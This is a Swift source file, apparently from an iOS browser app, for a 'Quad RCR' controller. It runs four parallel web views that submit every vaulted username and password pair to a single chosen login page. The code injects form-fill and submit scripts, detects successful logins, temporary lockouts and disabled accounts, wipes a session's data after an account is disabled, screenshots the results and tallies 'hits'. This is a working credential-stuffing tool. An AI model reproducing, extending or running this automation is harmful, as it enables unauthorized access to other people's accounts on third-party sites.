import Foundation
import SwiftData
import SwiftUI
import UIKit
import WebKit

/// Owns the four `QuadSession` objects and orchestrates Quad-Mode RCR.
@Observable
@MainActor
final class QuadController {
    let sessions: [QuadSession]
    var focusedIndex: Int = 0
    var anyRCRRunning: Bool {
        sessions.contains { $0.rcrRunning }
    }
    var lastCompletedAt: Date?
    /// When `true`, sessions retry passwords that previously came back as
    /// `failed`. `success` and `disabled` results are always skipped.
    var retryFailed: Bool = false

    private weak var browserViewModel: BrowserViewModel?
    private var modelContext: ModelContext?

    init() {
        self.sessions = (0..<4).map { QuadSession(index: $0) }
    }

    func setup(modelContext: ModelContext, browser: BrowserViewModel) {
        self.modelContext = modelContext
        self.browserViewModel = browser
        for s in sessions where s.url == nil {
            s.url = BrowserViewModel.defaultHomeURL
        }
    }

    var focusedSession: QuadSession { sessions[focusedIndex] }

    func navigateFocused(to url: URL) {
        let s = focusedSession
        s.url = url
        s.webView?.load(URLRequest(url: url))
    }

    func navigateAll(to url: URL) {
        for s in sessions {
            s.url = url
            s.webView?.load(URLRequest(url: url))
        }
        syncFocusedURLBarIfNeeded(session: focusedSession)
    }

    func syncFocusedURLBarIfNeeded(session: QuadSession) {
        guard session.index == focusedIndex,
              let browserViewModel,
              browserViewModel.isQuadMode,
              !browserViewModel.isURLBarEditing else { return }
        browserViewModel.updateURLBar()
    }

    // MARK: - Queue snapshot for the per-session pill

    func queueSnapshot(for s: QuadSession, upcomingLimit: Int = 8) -> [RCRQueueItem] {
        guard !s.rcrQueueIDs.isEmpty else { return [] }
        var items: [RCRQueueItem] = []
        let total = s.rcrQueueIDs.count
        let upper = min(s.rcrIndex + upcomingLimit + 1, total)
        for i in s.rcrIndex..<upper {
            let id = s.rcrQueueIDs[i]
            let username = i < s.rcrQueueUsernames.count ? s.rcrQueueUsernames[i] : ""
            let pwCount = i < s.rcrQueuePasswordCounts.count ? s.rcrQueuePasswordCounts[i] : 0
            items.append(RCRQueueItem(
                id: id,
                username: username,
                passwordCount: pwCount,
                isCompleted: false,
                isCurrent: i == s.rcrIndex
            ))
        }
        return items
    }

    func completedSnapshot(for s: QuadSession) -> [RCRQueueItem] {
        guard !s.rcrQueueIDs.isEmpty else { return [] }
        var items: [RCRQueueItem] = []
        for (i, id) in s.rcrQueueIDs.enumerated() where s.rcrCompletedIDs.contains(id) {
            let username = i < s.rcrQueueUsernames.count ? s.rcrQueueUsernames[i] : ""
            let pwCount = i < s.rcrQueuePasswordCounts.count ? s.rcrQueuePasswordCounts[i] : 0
            items.append(RCRQueueItem(
                id: id,
                username: username,
                passwordCount: pwCount,
                isCompleted: true,
                isCurrent: false
            ))
        }
        return items
    }

    // MARK: - Quad RCR

    func startQuadRCR(targetURL: URL) {
        guard let context = modelContext else { return }
        let descriptor = FetchDescriptor<Credential>(
            sortBy: [
                SortDescriptor(\Credential.domain),
                SortDescriptor(\Credential.username)
            ]
        )
        guard let all = try? context.fetch(descriptor), !all.isEmpty else {
            browserViewModel?.showToast("Vault is empty")
            return
        }

        let excluded = browserViewModel?.excludedDomainSet ?? []
        let queue = all.filter { !excluded.contains(ExcludedDomain.canonicalize($0.domain)) }
        guard !queue.isEmpty else {
            browserViewModel?.showToast("Vault is empty")
            return
        }

        // Stable round-robin partition based on credential ID hash so a
        // credential lands in the same cell on every resume.
        var slices: [[Credential]] = Array(repeating: [], count: 4)
        for c in queue {
            let bucket = stableBucket(for: c.id, mod: 4)
            slices[bucket].append(c)
        }

        let targetDomain = targetURL.host(percentEncoded: false)?.lowercased() ?? ""
        let tracker = AttemptTrackingService.shared

        for s in sessions {
            let creds = slices[s.index]
            let credIDs = creds.map(\.id)
            let usernames = creds.map(\.username)
            let counts: [Int] = credIDs.map { id in
                KeychainService.shared.getPasswords(for: id).count
            }

            s.rcrQueueIDs = credIDs
            s.rcrQueueUsernames = usernames
            s.rcrQueuePasswordCounts = counts
            s.rcrTotal = credIDs.count
            s.rcrIndex = 0
            s.rcrPasswordIndex = 0
            s.rcrSuccessCount = 0
            s.rcrCompletedIDs = []
            s.rcrTargetURL = targetURL
            s.rcrCurrentDomain = targetURL.host(percentEncoded: false) ?? ""
            s.rcrAwaitingNavigation = false

            // Skip already-finished credentials at the head of the queue,
            // plus any that were ever globally perma-disabled.
            while s.rcrIndex < s.rcrTotal {
                let id = s.rcrQueueIDs[s.rcrIndex]
                let total = s.rcrQueuePasswordCounts[s.rcrIndex]
                let finished = tracker.credentialIsFinished(
                    context: context,
                    credentialID: id,
                    targetDomain: targetDomain,
                    totalPasswords: total
                )
                if finished || PermaDisabledStore.shared.isDisabled(credentialID: id) {
                    s.rcrCompletedIDs.insert(id)
                    s.rcrIndex += 1
                } else {
                    break
                }
            }

            if s.rcrTotal > 0 && s.rcrIndex < s.rcrTotal {
                s.rcrRunning = true
                s.rcrStatus = .navigating
                Task { await self.runCurrent(session: s) }
            } else {
                s.rcrRunning = false
                s.rcrStatus = .finished
            }
        }
    }

    private func stableBucket(for id: String, mod: Int) -> Int {
        var hash: UInt64 = 1469598103934665603
        for byte in id.utf8 {
            hash ^= UInt64(byte)
            hash = hash &* 1099511628211
        }
        return Int(hash % UInt64(mod))
    }

    func stopQuadRCR(reason: String? = nil) {
        for s in sessions where s.rcrRunning {
            s.rcrRunning = false
            s.rcrStatus = .idle
            s.rcrAwaitingNavigation = false
            s.rcrExtraSubmitsInFlight = false
            s.webView?.evaluateJavaScript(
                JavaScriptInjectionService.rcrUninstallObserverScript(),
                completionHandler: nil
            )
        }
        if let reason { browserViewModel?.showToast(reason) }
    }

    private func currentCredential(_ session: QuadSession) -> Credential? {
        guard session.rcrIndex < session.rcrQueueIDs.count, let context = modelContext else { return nil }
        let id = session.rcrQueueIDs[session.rcrIndex]
        let descriptor = FetchDescriptor<Credential>(predicate: #Predicate<Credential> { $0.id == id })
        return try? context.fetch(descriptor).first
    }

    private func runCurrent(session s: QuadSession) async {
        guard s.rcrRunning else { return }
        // Skip credentials in temp-disabled cooldown OR ever perma-disabled.
        while s.rcrIndex < s.rcrQueueIDs.count {
            let id = s.rcrQueueIDs[s.rcrIndex]
            if TempDisabledStore.shared.isDisabled(credentialID: id)
                || PermaDisabledStore.shared.isDisabled(credentialID: id) {
                s.rcrCompletedIDs.insert(id)
                s.rcrIndex += 1
                s.rcrPasswordIndex = 0
            } else {
                break
            }
        }
        guard s.rcrIndex < s.rcrQueueIDs.count else {
            s.rcrRunning = false
            s.rcrStatus = .finished
            checkAllFinished()
            return
        }

        guard let credential = currentCredential(s) else {
            s.rcrIndex += 1
            await runCurrent(session: s)
            return
        }

        let credID = credential.id
        let allPasswords = await Task.detached {
            KeychainService.shared.getPasswords(for: credID)
        }.value

        guard !allPasswords.isEmpty else {
            s.rcrCompletedIDs.insert(credential.id)
            s.rcrIndex += 1
            s.rcrPasswordIndex = 0
            await runCurrent(session: s)
            return
        }

        // Resume-safe filtering.
        let targetDomain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? ""
        let filtered: [String]
        if let context = modelContext {
            if retryFailed {
                let tracker = AttemptTrackingService.shared
                filtered = allPasswords.filter { pw in
                    !tracker.isTerminallyAttempted(
                        context: context,
                        credentialID: credID,
                        passwordHash: PasswordFingerprint.hash(pw),
                        targetDomain: targetDomain
                    )
                }
            } else {
                let descriptor = FetchDescriptor<AttemptRecord>(
                    predicate: #Predicate<AttemptRecord> { rec in
                        rec.credentialID == credID
                            && rec.targetDomain == targetDomain
                            && rec.statusRaw != "pending"
                            && rec.statusRaw != "skipped"
                    }
                )
                let attempted = Set(((try? context.fetch(descriptor)) ?? []).map { $0.passwordHash })
                filtered = allPasswords.filter { !attempted.contains(PasswordFingerprint.hash($0)) }
            }
        } else {
            filtered = allPasswords
        }

        guard !filtered.isEmpty else {
            s.rcrCompletedIDs.insert(credential.id)
            s.rcrIndex += 1
            s.rcrPasswordIndex = 0
            await runCurrent(session: s)
            return
        }

        s.rcrPasswords = filtered
        s.rcrPasswordIndex = 0
        s.rcrCurrentUsername = credential.username
        if let target = s.rcrTargetURL {
            s.rcrCurrentDomain = target.host(percentEncoded: false) ?? credential.domain
        }

        let liveURL = s.webView?.url ?? s.url
        if !sameTarget(liveURL, s.rcrTargetURL), let target = s.rcrTargetURL {
            s.rcrStatus = .navigating
            s.rcrAwaitingNavigation = true
            s.url = target
            s.webView?.load(URLRequest(url: target))
            return
        }

        await attemptFill(session: s)
    }

    private func sameTarget(_ a: URL?, _ b: URL?) -> Bool {
        guard let a, let b else { return false }
        return a.scheme?.lowercased() == b.scheme?.lowercased()
            && a.host(percentEncoded: false)?.lowercased() == b.host(percentEncoded: false)?.lowercased()
            && a.path == b.path
    }

    private func attemptFill(session s: QuadSession) async {
        guard s.rcrRunning, !s.rcrPasswords.isEmpty else { return }
        guard let credential = currentCredential(s) else {
            s.rcrIndex += 1
            await runCurrent(session: s)
            return
        }
        let password = s.rcrPasswords[s.rcrPasswordIndex]
        let targetDomain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
        let siteSetting = browserViewModel?.fetchSiteSetting(for: targetDomain)

        s.rcrStatus = .filling
        let fillScript = JavaScriptInjectionService.fillCredentialScript(
            username: credential.username,
            password: password,
            usernameSelector: siteSetting?.usernameSelector,
            passwordSelector: siteSetting?.passwordSelector,
            suppressKeyboard: true
        )
        _ = try? await s.webView?.evaluateJavaScript(fillScript)
        guard s.rcrRunning else { return }

        s.rcrStatus = .submitting
        let submitScript = JavaScriptInjectionService.submitFormScript(
            submitSelector: siteSetting?.submitButtonSelector
        )
        _ = try? await s.webView?.evaluateJavaScript(submitScript)
        guard s.rcrRunning else { return }

        // Optional extra submits (sure-login). Paused while in-flight.
        let extraCount = max(0, UserDefaults.standard.integer(forKey: "rcrExtraSubmits"))
        let rawDelay = UserDefaults.standard.double(forKey: "rcrSubmitDelay")
        let delay = rawDelay > 0 ? rawDelay : 1.5
        if extraCount > 0 {
            s.rcrExtraSubmitsInFlight = true
            for _ in 0..<extraCount {
                try? await Task.sleep(for: .seconds(delay))
                guard s.rcrRunning else { s.rcrExtraSubmitsInFlight = false; return }
                _ = try? await s.webView?.evaluateJavaScript(submitScript)
            }
            s.rcrExtraSubmitsInFlight = false
        }
        guard s.rcrRunning else { return }

        credential.lastUsedAt = Date()
        credential.usageCount += 1

        // Pre-record pending.
        if let context = modelContext {
            _ = AttemptTrackingService.shared.recordAttempt(
                context: context,
                credentialID: credential.id,
                username: credential.username,
                password: password,
                passwordIndex: s.rcrPasswordIndex + 1,
                passwordTotal: s.rcrPasswords.count,
                targetDomain: targetDomain,
                sessionTag: s.sessionTag,
                status: .pending
            )
        }

        s.rcrStatus = .waiting
        let successSel = siteSetting?.successSelector
        let installScript = JavaScriptInjectionService.rcrInstallObserverScript(successSelector: successSel)
        _ = try? await s.webView?.evaluateJavaScript(installScript)
        guard s.rcrRunning else { return }
    }

    func handleRCRMessage(session s: QuadSession, payload: [String: Any]) {
        guard s.rcrRunning, s.rcrStatus == .waiting else { return }
        if s.rcrExtraSubmitsInFlight { return }
        let hasPassword = payload["hasPassword"] as? Bool ?? false
        let hasWelcome = payload["hasWelcome"] as? Bool ?? false
        let hasDisabled = payload["hasDisabled"] as? Bool ?? false
        let hasTempDisabled = payload["hasTempDisabled"] as? Bool ?? false
        let hasSuccess = payload["hasSuccess"] as? Bool ?? false
        let isHomepage = payload["isHomepage"] as? Bool ?? false

        guard let credential = currentCredential(s) else {
            s.rcrIndex += 1
            Task { await self.runCurrent(session: s) }
            return
        }

        let password = s.rcrPasswords[safe: s.rcrPasswordIndex] ?? ""

        if hasWelcome || hasSuccess || (isHomepage && !hasPassword) {
            s.rcrSuccessCount += 1
            s.rcrStatus = .success
            s.rcrCompletedIDs.insert(credential.id)
            captureAndRecord(session: s, credential: credential, password: password, status: .success)
            s.rcrIndex += 1
            s.rcrPasswordIndex = 0
            Task { await self.runCurrent(session: s) }
            return
        }

        if hasDisabled {
            PermaDisabledStore.shared.markDisabled(credentialID: credential.id)
            captureAndRecord(session: s, credential: credential, password: password, status: .disabled)
            Task { await self.burnAndAdvance(session: s, completedID: credential.id) }
            return
        }

        if hasTempDisabled {
            captureAndRecord(session: s, credential: credential, password: password, status: .tempDisabled)
            let hasMore = s.rcrPasswords.count > 1
            if hasMore {
                TempDisabledStore.shared.markDisabled(credentialID: credential.id)
                browserViewModel?.showToast("Temp-disabled — \(credential.username)")
                s.rcrCompletedIDs.insert(credential.id)
                s.rcrIndex += 1
                s.rcrPasswordIndex = 0
                Task { await self.runCurrent(session: s) }
            } else {
                if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
                    s.rcrPasswordIndex += 1
                    Task { await self.attemptFill(session: s) }
                } else {
                    s.rcrCompletedIDs.insert(credential.id)
                    s.rcrIndex += 1
                    s.rcrPasswordIndex = 0
                    Task { await self.runCurrent(session: s) }
                }
            }
            return
        }

        if hasPassword {
            captureAndRecord(session: s, credential: credential, password: password, status: .failed)
            if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
                s.rcrPasswordIndex += 1
                Task { await self.attemptFill(session: s) }
            } else {
                s.rcrCompletedIDs.insert(credential.id)
                s.rcrIndex += 1
                s.rcrPasswordIndex = 0
                Task { await self.runCurrent(session: s) }
            }
        }
    }

    private func burnAndAdvance(session s: QuadSession, completedID: String) async {
        s.rcrStatus = .burning
        s.rcrBurnFlash &+= 1
        s.webView?.stopLoading()
        await QuadDataStore.burn(index: s.index)
        guard s.rcrRunning else { return }
        s.rcrCompletedIDs.insert(completedID)
        s.rcrIndex += 1
        s.rcrPasswordIndex = 0
        if let target = s.rcrTargetURL {
            s.rcrStatus = .navigating
            s.rcrAwaitingNavigation = true
            s.url = target
            s.webView?.load(URLRequest(url: target))
            return
        }
        await runCurrent(session: s)
    }

    func cellPageDidFinish(session s: QuadSession) {
        guard s.rcrRunning else { return }
        if s.rcrAwaitingNavigation {
            s.rcrAwaitingNavigation = false
            Task { await attemptFill(session: s) }
            return
        }
        if s.rcrExtraSubmitsInFlight { return }
        if s.rcrStatus == .waiting || s.rcrStatus == .submitting {
            let successSel = browserViewModel?.fetchSiteSetting(for: s.rcrCurrentDomain)?.successSelector
            s.webView?.evaluateJavaScript(
                JavaScriptInjectionService.rcrInstallObserverScript(successSelector: successSel),
                completionHandler: nil
            )
        }
    }

    private func checkAllFinished() {
        let allDone = sessions.allSatisfy { !$0.rcrRunning }
        guard allDone else { return }
        let totalSuccess = sessions.reduce(0) { $0 + $1.rcrSuccessCount }
        let totalTried = sessions.reduce(0) { $0 + $1.rcrTotal }
        lastCompletedAt = Date()
        browserViewModel?.showToast("Quad RCR complete — \(totalSuccess) hits / \(totalTried) tried")
    }

    private func captureAndRecord(
        session s: QuadSession,
        credential: Credential,
        password: String,
        status: AttemptRecord.Status
    ) {
        guard let context = modelContext else { return }
        let webView = s.webView
        let pageURL = webView?.url?.absoluteString
        let pageTitle = webView?.title
        let targetDomain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
        let pwIndex = s.rcrPasswordIndex + 1
        let pwTotal = s.rcrPasswords.count
        let credID = credential.id
        let username = credential.username
        let tag = s.sessionTag

        if let webView {
            let config = WKSnapshotConfiguration()
            config.snapshotWidth = 600
            webView.takeSnapshot(with: config) { image, _ in
                Task { @MainActor in
                    let filename = image.flatMap { ScreenshotStorage.save($0) }
                    _ = AttemptTrackingService.shared.recordAttempt(
                        context: context,
                        credentialID: credID,
                        username: username,
                        password: password,
                        passwordIndex: pwIndex,
                        passwordTotal: pwTotal,
                        targetDomain: targetDomain,
                        sessionTag: tag,
                        status: status,
                        resultURL: pageURL,
                        resultPageTitle: pageTitle,
                        screenshotFilename: filename
                    )
                }
            }
        } else {
            _ = AttemptTrackingService.shared.recordAttempt(
                context: context,
                credentialID: credID,
                username: username,
                password: password,
                passwordIndex: pwIndex,
                passwordTotal: pwTotal,
                targetDomain: targetDomain,
                sessionTag: tag,
                status: status,
                resultURL: pageURL,
                resultPageTitle: pageTitle,
                screenshotFilename: nil
            )
        }
    }
}

private extension Array {
    subscript(safe index: Int) -> Element? {
        indices.contains(index) ? self[index] : nil
    }
}
